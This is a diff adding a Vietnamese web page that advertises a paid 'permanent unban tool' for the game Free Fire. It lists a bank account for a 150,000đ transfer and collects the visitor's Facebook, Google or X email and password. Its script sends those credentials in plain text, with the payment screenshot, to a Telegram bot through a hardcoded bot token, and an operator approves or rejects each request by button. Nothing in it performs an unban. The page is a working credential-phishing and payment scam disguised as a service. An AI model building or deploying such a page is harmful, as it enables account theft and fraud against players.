@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, shrink-to-fit=no">
+  <title>Tool Mở Band Vĩnh Viễn Free Fire | Thanh Toán & Mở Ngay</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #0a0f1e 0%, #141b2b 100%);
+      color: #eef5ff;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(0, 255, 196, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 196, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 750px;
+      width: 100%;
+      background: rgba(20, 28, 45, 0.85);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(0, 255, 200, 0.25);
+      border-radius: 36px;
+      padding: 30px 25px 35px;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 200, 0.2), 0 0 40px rgba(0, 180, 216, 0.3);
+      z-index: 2;
+      transition: all 0.3s ease;
+      text-align: center;
+    }
+
+    .header-icon {
+      font-size: 3.5rem;
+      color: #00ffe0;
+      filter: drop-shadow(0 0 15px #00e6c0);
+      margin-bottom: 10px;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-8px); }
+      100% { transform: translateY(0px); }
+    }
+
+    h1 {
+      font-size: 2.4rem;
+      font-weight: 800;
+      background: linear-gradient(to right, #ffd966, #ffb347, #ff8c42);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 5px;
+      letter-spacing: 1px;
+      text-shadow: 0 0 15px rgba(255, 140, 0, 0.5);
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      color: #b0d4ff;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .subtitle i {
+      color: #f0b90b;
+    }
+
+    .price-badge {
+      background: linear-gradient(145deg, #1e2b3f, #0f1729);
+      border: 1px solid #ffb74d;
+      border-radius: 50px;
+      padding: 12px 25px;
+      margin: 20px auto;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: bold;
+      font-size: 1.7rem;
+      color: #ffd966;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.5), 0 0 20px rgba(255, 180, 0, 0.4);
+    }
+
+    .old-price {
+      font-size: 1rem;
+      text-decoration: line-through;
+      color: #9aa9c1;
+      margin-left: 6px;
+      font-weight: normal;
+    }
+
+    /* Thông tin chuyển khoản */
+    .bank-info {
+      background: rgba(0, 180, 216, 0.1);
+      border: 1px solid #00c8ff;
+      border-radius: 24px;
+      padding: 18px;
+      margin: 20px 0;
+      text-align: left;
+    }
+
+    .bank-detail {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      font-size: 1rem;
+      margin: 6px 0;
+    }
+
+    .copy-btn {
+      background: #0077ff;
+      border: none;
+      color: white;
+      padding: 5px 12px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      transition: 0.2s;
+    }
+
+    .copy-btn:hover {
+      background: #0055cc;
+    }
+
+    /* Form */
+    .unban-form-section {
+      background: rgba(10, 20, 38, 0.8);
+      border-radius: 28px;
+      padding: 20px 18px;
+      margin: 20px 0 18px;
+      border: 1px solid rgba(0, 200, 255, 0.4);
+      backdrop-filter: blur(10px);
+    }
+
+    .form-title {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: #00e6ff;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .platform-selector {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .platform-option {
+      background: #1d2c45;
+      border: 2px solid #2e405b;
+      border-radius: 40px;
+      padding: 10px 22px;
+      font-weight: 600;
+      color: #cfdefa;
+      cursor: pointer;
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.95rem;
+    }
+
+    .platform-option i {
+      font-size: 1.2rem;
+    }
+
+    .platform-option.active {
+      background: #0077ff;
+      border-color: #00e6ff;
+      color: white;
+      box-shadow: 0 0 20px #0077ff;
+    }
+
+    .platform-option:hover {
+      border-color: #00b8ff;
+      background: #1f3355;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 5px;
+      color: #bdd3ff;
+      font-size: 0.9rem;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 40px;
+      border: 1px solid #3f5580;
+      background: #0b1322;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      transition: 0.2s;
+      font-family: inherit;
+    }
+
+    .input-field:focus {
+      border-color: #00c8ff;
+      box-shadow: 0 0 12px #0077ff;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #7f9bc0;
+      font-size: 1.2rem;
+      transition: 0.2s;
+    }
+
+    .toggle-password:hover {
+      color: #00e6ff;
+    }
+
+    .file-upload {
+      background: #0b1322;
+      border: 2px dashed #3f5580;
+      border-radius: 20px;
+      padding: 20px;
+      text-align: center;
+      cursor: pointer;
+      margin: 10px 0;
+      transition: 0.2s;
+    }
+
+    .file-upload:hover {
+      border-color: #00c8ff;
+    }
+
+    .btn-submit {
+      background: linear-gradient(180deg, #00c9a7 0%, #0077b6 100%);
+      border: none;
+      border-radius: 60px;
+      padding: 16px 25px;
+      width: 100%;
+      font-weight: 800;
+      font-size: 1.4rem;
+      color: white;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(0, 180, 216, 0.5);
+      transition: all 0.25s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 10px;
+      border: 1px solid #40e0d0;
+    }
+
+    .btn-submit:hover {
+      transform: scale(1.02);
+      box-shadow: 0 15px 35px #00a6ff;
+      background: linear-gradient(180deg, #00d9b5 0%, #0088cc 100%);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .status-box {
+      margin-top: 20px;
+      padding: 18px;
+      border-radius: 20px;
+      background: #0b1322;
+      font-weight: bold;
+      border: 1px solid #3f5580;
+      font-size: 1rem;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .features {
+      background: rgba(10, 20, 35, 0.7);
+      border-radius: 28px;
+      padding: 18px 15px;
+      margin: 25px 0 20px;
+      border: 1px solid rgba(0, 200, 255, 0.3);
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      text-align: left;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 1.05rem;
+      color: #d0e2ff;
+      background: rgba(255,255,255,0.03);
+      padding: 8px 14px;
+      border-radius: 20px;
+    }
+
+    .feature-item i {
+      font-size: 1.4rem;
+      color: #2ecc71;
+      width: 28px;
+      text-align: center;
+    }
+
+    hr {
+      border: 0.5px solid rgba(255,255,255,0.1);
+      margin: 20px 0 10px;
+    }
+
+    @media (max-width: 500px) {
+      .container { padding: 20px 15px; }
+      h1 { font-size: 1.9rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header-icon">
+      <i class="fas fa-shield-haltered"></i>
+    </div>
+    <h1>MỞ BAND VĨNH VIỄN</h1>
+    <div class="subtitle">
+      <i class="fas fa-check-circle"></i> Free Fire • Thanh toán trước • Duyệt tự động
+      <i class="fas fa-check-circle"></i> Bảo Hành Trọn Đời
+    </div>
+
+    <div class="price-badge">
+      <i class="fas fa-tag"></i> 150.000đ 
+      <span class="old-price">400.000đ</span>
+    </div>
+
+    <!-- THÔNG TIN CHUYỂN KHOẢN -->
+    <div class="bank-info">
+      <div class="bank-detail">
+        <span><i class="fas fa-university"></i> <strong>Ngân hàng:</strong> MB Bank</span>
+      </div>
+      <div class="bank-detail">
+        <span><i class="fas fa-user"></i> <strong>Chủ TK:</strong> Tran Nguyen Duc Minh</span>
+      </div>
+      <div class="bank-detail">
+        <span><i class="fas fa-credit-card"></i> <strong>STK:</strong> 0644612345555</span>
+        <button class="copy-btn" onclick="copyToClipboard('0644612345555')">
+          <i class="fas fa-copy"></i> Sao chép
+        </button>
+      </div>
+      <div class="bank-detail">
+        <span><i class="fas fa-money-bill-wave"></i> <strong>Số tiền:</strong> 150.000 VNĐ</span>
+      </div>
+    </div>
+
+    <!-- FORM MỞ BAND -->
+    <div class="unban-form-section">
+      <div class="form-title">
+        <i class="fas fa-bolt"></i> GỬI YÊU CẦU MỞ BAND
+      </div>
+      
+      <!-- Chọn nền tảng tài khoản -->
+      <div class="platform-selector" id="platformSelector">
+        <div class="platform-option active" data-platform="facebook">
+          <i class="fab fa-facebook"></i> Facebook
+        </div>
+        <div class="platform-option" data-platform="google">
+          <i class="fab fa-google"></i> Google
+        </div>
+        <div class="platform-option" data-platform="twitter">
+          <i class="fab fa-x-twitter"></i> X
+        </div>
+      </div>
+
+      <!-- Input tài khoản -->
+      <div class="input-group">
+        <label><i class="fas fa-id-card"></i> ID tài khoản Free Fire</label>
+        <input type="text" class="input-field" id="ffIdInput" placeholder="Nhập UID Free Fire (vd: 123456789)" autocomplete="off">
+      </div>
+
+      <div class="input-group">
+        <label><i class="fas fa-envelope"></i> Email / SĐT tài khoản nền tảng</label>
+        <input type="text" class="input-field" id="platformAccountInput" placeholder="Nhập email Facebook/Google/X" autocomplete="off">
+      </div>
+
+      <!-- Ô NHẬP MẬT KHẨU - TÍCH HỢP MỚI -->
+      <div class="input-group">
+        <label><i class="fas fa-lock"></i> Mật khẩu tài khoản nền tảng</label>
+        <div class="password-container">
+          <input type="password" class="input-field" id="passwordInput" placeholder="Nhập mật khẩu tài khoản" autocomplete="off">
+          <i class="fas fa-eye toggle-password" id="togglePassword" onclick="togglePasswordVisibility()"></i>
+        </div>
+      </div>
+
+      <!-- Upload ảnh chuyển khoản -->
+      <div class="input-group">
+        <label><i class="fas fa-camera"></i> Ảnh chụp giao dịch chuyển khoản</label>
+        <div class="file-upload" id="fileUploadArea">
+          <i class="fas fa-cloud-upload-alt" style="font-size:2rem; color:#00c8ff;"></i>
+          <p style="color:#bdd3ff;">Nhấp để tải ảnh lên (bắt buộc)</p>
+          <input type="file" id="paymentImage" accept="image/*" hidden>
+          <img id="imagePreview" style="max-width:100%; max-height:200px; margin-top:10px; border-radius:12px; display:none;">
+        </div>
+      </div>
+
+      <button class="btn-submit" id="submitRequestBtn">
+        <i class="fas fa-paper-plane"></i> CHẠY TOOL + ẢNH CHUYỂN KHOẢN
+      </button>
+    </div>
+
+    <!-- KẾT QUẢ PHÊ DUYỆT -->
+    <div id="resultBox" class="status-box hidden"></div>
+
+    <!-- Tính năng -->
+    <div class="features">
+      <div class="feature-item">
+        <i class="fas fa-unlock-alt"></i>
+        <strong>Mở khóa vĩnh viễn</strong> – Tài khoản bị band 100%
+      </div>
+      <div class="feature-item">
+        <i class="fas fa-clock"></i>
+        <strong>Thời gian xử lý:</strong> 15-45 phút
+      </div>
+      <div class="feature-item">
+        <i class="fas fa-shield-virus"></i>
+        <strong>An toàn tuyệt đối</strong> – Không mất đồ, rank, skin
+      </div>
+    </div>
+
+    <hr>
+    <div style="margin-top: 12px; font-size: 0.8rem; color: #6c7e9e;">
+      © 2025 Tool Mở Band Free Fire • Hệ thống tự động gửi 
+    </div>
+  </div>
+
+  <script>
+    // ============ CẤU HÌNH TELEGRAM ============
+    const TELEGRAM_BOT_TOKEN = '8732357215:AAFmcjicU5ejU7xZ70vAmkG8Coqk-iDY3VI';
+    const TELEGRAM_CHAT_ID = '8998147404';
+    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+    let selectedPlatform = 'facebook';
+    let paymentImageFile = null;
+    let pollingOffset = 0;
+
+    // ============ HIỂN THỊ/ẨN MẬT KHẨU ============
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('passwordInput');
+      const toggleIcon = document.getElementById('togglePassword');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.classList.remove('fa-eye');
+        toggleIcon.classList.add('fa-eye-slash');
+      } else {
+        passwordInput.type = 'password';
+        toggleIcon.classList.remove('fa-eye-slash');
+        toggleIcon.classList.add('fa-eye');
+      }
+    }
+
+    // ============ CHỌN NỀN TẢNG ============
+    document.querySelectorAll('.platform-option').forEach(opt => {
+      opt.addEventListener('click', function() {
+        document.querySelectorAll('.platform-option').forEach(o => o.classList.remove('active'));
+        this.classList.add('active');
+        selectedPlatform = this.dataset.platform;
+        
+        // Cập nhật placeholder
+        const platformInput = document.getElementById('platformAccountInput');
+        if (selectedPlatform === 'facebook') platformInput.placeholder = 'Nhập email Facebook hoặc SĐT';
+        else if (selectedPlatform === 'google') platformInput.placeholder = 'Nhập Gmail đăng nhập Google';
+        else if (selectedPlatform === 'twitter') platformInput.placeholder = 'Nhập email hoặc @username X';
+      });
+    });
+
+    // ============ UPLOAD ẢNH ============
+    const fileInput = document.getElementById('paymentImage');
+    const fileUploadArea = document.getElementById('fileUploadArea');
+    const imagePreview = document.getElementById('imagePreview');
+
+    fileUploadArea.addEventListener('click', () => fileInput.click());
+    
+    fileInput.addEventListener('change', (e) => {
+      if (e.target.files.length > 0) {
+        paymentImageFile = e.target.files[0];
+        const reader = new FileReader();
+        reader.onload = (ev) => {
+          imagePreview.src = ev.target.result;
+          imagePreview.style.display = 'block';
+        };
+        reader.readAsDataURL(paymentImageFile);
+      }
+    });
+
+    // ============ COPY STK ============
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert('✅ Đã sao chép số tài khoản: ' + text);
+      }).catch(() => {
+        alert('⚠️ Không thể sao chép tự động. Vui lòng sao chép thủ công.');
+      });
+    }
+
+    // ============ GỬI YÊU CẦU ============
+    document.getElementById('submitRequestBtn').addEventListener('click', async () => {
+      const ffId = document.getElementById('ffIdInput').value.trim();
+      const platformAcc = document.getElementById('platformAccountInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+      const resultBox = document.getElementById('resultBox');
+
+      // Validate
+      if (!ffId) {
+        alert('❌ Vui lòng nhập ID Free Fire.');
+        return;
+      }
+      if (!platformAcc) {
+        alert('❌ Vui lòng nhập Email/SĐT tài khoản nền tảng.');
+        return;
+      }
+      if (!password) {
+        alert('❌ Vui lòng nhập mật khẩu tài khoản nền tảng.');
+        return;
+      }
+      if (!paymentImageFile) {
+        alert('❌ Vui lòng tải lên ảnh chụp giao dịch chuyển khoản.');
+        return;
+      }
+
+      // Vô hiệu hóa nút
+      const btn = document.getElementById('submitRequestBtn');
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang gửi yêu cầu...';
+
+      try {
+        // 1. Gửi ảnh chuyển khoản lên Telegram
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', paymentImageFile);
+        formData.append('caption', '📸 Ảnh chuyển khoản từ khách hàng');
+
+        const photoRes = await fetch(`${TELEGRAM_API}/sendPhoto`, { 
+          method: 'POST', 
+          body: formData 
+        });
+        const photoData = await photoRes.json();
+
+        if (!photoData.ok) {
+          throw new Error('Gửi ảnh thất bại: ' + JSON.stringify(photoData));
+        }
+
+        // 2. Gửi tin nhắn chi tiết kèm nút duyệt
+        const messageText = `
+🔔 <b>YÊU CẦU MỞ BAND MỚI</b>
+
+👤 <b>UID Free Fire:</b> <code>${ffId}</code>
+🔗 <b>Nền tảng:</b> ${selectedPlatform.toUpperCase()}
+📧 <b>Tài khoản:</b> ${platformAcc}
+🔐 <b>Mật khẩu:</b> <code>${password}</code>
+🏦 <b>Đã chuyển khoản:</b> 150.000đ - MB Bank
+⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
+        `.trim();
+
+        const inlineKeyboard = {
+          inline_keyboard: [
+            [
+              { 
+                text: '✅ ĐỒNG Ý (Mở band)', 
+                callback_data: `approve_${ffId}_${selectedPlatform}_${platformAcc}` 
+              },
+              { 
+                text: '❌ KHÔNG ĐỒNG Ý', 
+                callback_data: `reject_${ffId}_${selectedPlatform}_${platformAcc}` 
+              }
+            ]
+          ]
+        };
+
+        const msgRes = await fetch(`${TELEGRAM_API}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: messageText,
+            parse_mode: 'HTML',
+            reply_markup: inlineKeyboard
+          })
+        });
+
+        const msgData = await msgRes.json();
+        if (!msgData.ok) {
+          throw new Error('Gửi tin nhắn thất bại: ' + JSON.stringify(msgData));
+        }
+
+        // Lưu message_id để theo dõi
+        const sentMessageId = msgData.result.message_id;
+
+        // Hiển thị trạng thái chờ
+        resultBox.classList.remove('hidden');
+        resultBox.innerHTML = '⏳ <b>Đã gửi yêu cầu thành công!</b><br>Vui lòng chờ. Hệ thống sẽ tự động cập nhật kết quả...';
+        resultBox.style.color = '#ffd966';
+
+        // Bắt đầu polling kiểm tra phản hồi
+        startPollingForApproval(sentMessageId, ffId);
+
+      } catch (error) {
+        alert('❌ Lỗi: ' + error.message);
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU + ẢNH CHUYỂN KHOẢN';
+      }
+    });
+
+    // ============ POLLING KIỂM TRA DUYỆT ============
+    function startPollingForApproval(sentMessageId, ffId) {
+      const interval = setInterval(async () => {
+        try {
+          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${pollingOffset}&timeout=5`);
+          const data = await res.json();
+          
+          if (!data.ok || !data.result.length) return;
+
+          for (const update of data.result) {
+            pollingOffset = update.update_id + 1;
+
+            // Kiểm tra callback query từ nút bấm
+            if (update.callback_query) {
+              const cb = update.callback_query;
+              const callbackData = cb.data;
+              const msgId = cb.message?.message_id;
+
+              // Chỉ xử lý nếu là tin nhắn của chúng ta
+              if (msgId === sentMessageId) {
+                const parts = callbackData.split('_');
+                const action = parts[0]; // approve hoặc reject
+                const uid = parts[1];
+
+                if (action === 'approve') {
+                  updateResultOnWeb(true, 'Đã duyệt - Tool đang chạy mở band');
+                  
+                  // Gửi xác nhận về Telegram
+                  await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: TELEGRAM_CHAT_ID,
+                      text: `✅ <b>ĐÃ DUYỆT</b> mở band cho UID <code>${uid}</code>. Hệ thống đang chạy.`
+                    })
+                  });
+                  
+                  clearInterval(interval);
+                } else if (action === 'reject') {
+                  // Yêu cầu admin nhập lý do từ chối
+                  await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: TELEGRAM_CHAT_ID,
+                      text: `⚠️ <b>Vui lòng nhập lý do từ chối</b> cho UID <code>${uid}</code> (reply tin nhắn này)`,
+                      reply_to_message_id: msgId
+                    })
+                  });
+
+                  // Lắng nghe tin nhắn reply chứa lý do
+                  listenForRejectReason(uid, interval);
+                }
+
+                // Trả lời callback để nút biến mất
+                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ 
+                    callback_query_id: cb.id,
+                    text: action === 'approve' ? '✅ Đã duyệt!' : '❌ Đã từ chối!'
+                  })
+                });
+              }
+            }
+          }
+        } catch (e) {
+          console.error('Polling error:', e);
+        }
+      }, 3000);
+    }
+
+    // ============ LẮNG NGHE LÝ DO TỪ CHỐI ============
+    function listenForRejectReason(uid, mainInterval) {
+      const reasonInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${pollingOffset}&timeout=5`);
+          const data = await res.json();
+          
+          for (const update of data.result) {
+            pollingOffset = update.update_id + 1;
+            
+            if (update.message && update.message.reply_to_message) {
+              const replied = update.message.reply_to_message;
+              if (replied.text && replied.text.includes('Vui lòng nhập lý do từ chối')) {
+                const reason = update.message.text;
+                updateResultOnWeb(false, reason);
+                clearInterval(mainInterval);
+                clearInterval(reasonInterval);
+              }
+            }
+          }
+        } catch (e) {
+          console.error('Reason polling error:', e);
+        }
+      }, 3000);
+    }
+
+    // ============ CẬP NHẬT KẾT QUẢ TRÊN WEB ============
+    function updateResultOnWeb(approved, reason = '') {
+      const resultBox = document.getElementById('resultBox');
+      resultBox.classList.remove('hidden');
+      
+      const btn = document.getElementById('submitRequestBtn');
+      btn.disabled = false;
+      btn.innerHTML = '<i class="fas fa-paper-plane"></i> CHẠY TOOL + ẢNH CHUYỂN KHOẢN';
+
+      if (approved) {
+        resultBox.innerHTML = `
+          <div style="font-size:1.2rem;">✅ <b>ĐÃ ĐƯỢC DUYỆT!</b></div>
+          <div style="margin-top:8px;">Tool đang chạy mở band. Vui lòng đợi 15-45 phút.</div>
+          <div style="margin-top:8px; font-size:0.9rem;">Kiểm tra lại tài khoản sau thời gian xử lý.</div>
+        `;
+        resultBox.style.color = '#2ecc71';
+        resultBox.style.borderColor = '#2ecc71';
+      } else {
+        resultBox.innerHTML = `
+          <div style="font-size:1.2rem;">❌ <b>BỊ TỪ CHỐI</b></div>
+          <div style="margin-top:8px;"><strong>Lý do:</strong> ${reason || 'Không có lý do cụ thể'}</div>
+          <div style="margin-top:8px; font-size:0.9rem;">Vui lòng liên hệ admin nếu cần hỗ trợ thêm.</div>
+        `;
+        resultBox.style.color = '#ff6b6b';
+        resultBox.style.borderColor = '#ff6b6b';
+      }
+    }
+
+    // Khởi tạo placeholder ban đầu
+    document.getElementById('platformAccountInput').placeholder = 'Nhập email Facebook hoặc SĐT';
+  </script>
+</body>
+</html>
